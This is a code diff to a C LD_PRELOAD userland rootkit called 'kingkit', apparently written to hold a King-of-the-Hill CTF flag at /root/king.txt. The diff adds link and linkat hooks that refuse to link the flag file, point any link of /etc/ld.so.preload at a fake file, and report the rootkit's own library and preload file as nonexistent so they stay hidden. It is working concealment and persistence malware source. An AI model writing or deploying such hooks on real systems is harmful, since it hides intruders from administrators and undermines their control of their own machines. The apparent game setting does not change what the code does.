@@ -79,6 +79,8 @@ int unlinkat(int, const char *, int);
 int rename(const char *, const char *);
 int renameat(int, const char *, int, const char *);
 int renameat2(int, const char *, int, const char *, unsigned int);
+int link(const char *, const char *);
+int linkat(int, const char *, int, const char *, int);
 int mount(const char *, const char *, const char *, unsigned long, const void *data);
 time_t time(time_t *);
 
@@ -110,6 +112,8 @@ static int (*original_unlinkat)(int, const char *, int) = NULL;
 static int (*original_rename)(const char *, const char *) = NULL;
 static int (*original_renameat)(int, const char *, int, const char *) = NULL;
 static int (*original_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
+static int (*original_link)(const char *, const char *) = NULL;
+static int (*original_linkat)(int, const char *, int, const char *, int) = NULL;
 static int (*original_mount)(const char *, const char *, const char *, unsigned long, const void *data) = NULL;
 static time_t (*original_time)(time_t *) = NULL;
 
@@ -676,7 +680,7 @@ int unlink(const char *pathname) {
     #endif
     original_unlink = syscall_address(original_unlink, "unlink");
     char *real_pathname = realpath(pathname, NULL);
-    if (real_pathname == NULL) //catch errors like ENOENTre
+    if (real_pathname == NULL) //catch errors like ENOENT
         return (*original_unlink)(pathname);
     if (!strcmp(real_pathname, "/root/king.txt")) {
         free(real_pathname);
@@ -835,6 +839,56 @@ int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpa
     free(real_oldpath);
     free(real_newpath);
     return (*original_renameat2)(olddirfd, oldpath, newdirfd, newpath, flags);
+}
+
+
+int link(const char *oldpath, const char *newpath) {
+    #if DEBUG
+    printf("[kingkit] link called with oldpath: %s and newpath: %s.\n", oldpath, newpath);
+    #endif
+    original_link = syscall_address(original_link, "link");
+    char *real_oldpath = realpath(oldpath, NULL);
+    if (real_oldpath == NULL) {
+        return (*original_link)(oldpath, newpath);
+    }
+    if (!strcmp(real_oldpath, "/root/king.txt")) {
+        free(real_oldpath);
+        errno = EPERM;
+        return -1;
+    } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
+        oldpath = FAKE_PRELOAD;
+    } else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+        free(real_oldpath);
+        errno = ENOENT;
+        return -1;
+    }
+    free(real_oldpath);
+    return (*original_link)(oldpath, newpath);
+}
+
+
+int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) {
+    #if DEBUG
+	printf("[kingkit] linkat called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s and flags: %d.\n", olddirfd, oldpath, newdirfd, newpath, flags);
+    #endif
+    original_linkat = syscall_address(original_linkat, "linkat");
+    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
+    if (real_oldpath == NULL) {
+        return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
+    }
+    if (!strcmp(real_oldpath, "/root/king.txt")) {
+        free(real_oldpath);
+        errno = EPERM;
+        return -1;
+    } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
+        oldpath = FAKE_PRELOAD;
+    } else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
+        free(real_oldpath);
+        errno = ENOENT;
+        return -1;
+    }
+    free(real_oldpath);
+    return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
 }
 
 
